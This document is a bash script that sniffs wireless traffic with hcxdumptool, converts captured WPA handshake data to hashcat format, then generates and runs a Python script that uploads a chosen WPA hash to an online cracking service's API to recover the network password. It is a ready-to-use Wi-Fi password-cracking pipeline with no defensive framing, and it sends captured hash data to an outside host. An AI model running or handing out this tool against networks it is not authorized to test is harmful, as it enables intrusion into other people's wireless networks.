#!/bin/bash
read -p "Enter channel number: " ch
read -p "Enter frequency range: " fr
read -p "Enter file name: " na
read -p "Enter file name in desktop to save in: " fn
mkdir ./Desktop/$fn
cd ./Desktop/$fn
sudo hcxdumptool -w $na -c $ch -f $fr
sudo hcxpcapngtool -o hash.hc22000 ./$na
touch "SendToCrack.py"
exec > "SendToCrack.py"
cat <<EOF
import requests
import re

def read_hc22000_file(filename):
    wpa_lines = []
    with open(filename, 'r') as file:
        for line in file:
            if re.match(r'WPA\*0', line):
                wpa_lines.append(line.strip())
    return wpa_lines

if __name__ == '__main__':
    filename = 'hash.hc22000'  # Replace with your actual file name
    wpa_lines = read_hc22000_file(filename)

    if wpa_lines:
        for i, line in enumerate(wpa_lines):
            print(f"WPA_line_{i+1}: {line}")

        while True:
            try:
                choice = int(input("Enter the WPA_line number to set as cathash: "))
                if 1 <= choice <= len(wpa_lines):
                    cathash = wpa_lines[choice - 1]
                    print(f"cathash set to: {cathash}")
                    break
                else:
                    print("Invalid choice. Please enter a number between 1 and", len(wpa_lines))
            except ValueError:
                print("Invalid input. Please enter a number.")

    else:
        print("No lines starting with 'WPA*0' found in the file.")

APIKEY = input("Enter the API key from https://www.onlinehashcrack.com: ")
url = "https://api.onlinehashcrack.com/v2"
headers = {"Content-Type": "application/json"}
data = {
    "api_key": APIKEY,
    "agree_terms": "yes",
    "algo_mode": 22000,
    "hashes": [cathash]
}

response = requests.post(url, json=data, headers=headers)
print(response.json())
EOF
exec >&2
python SendToCrack.py
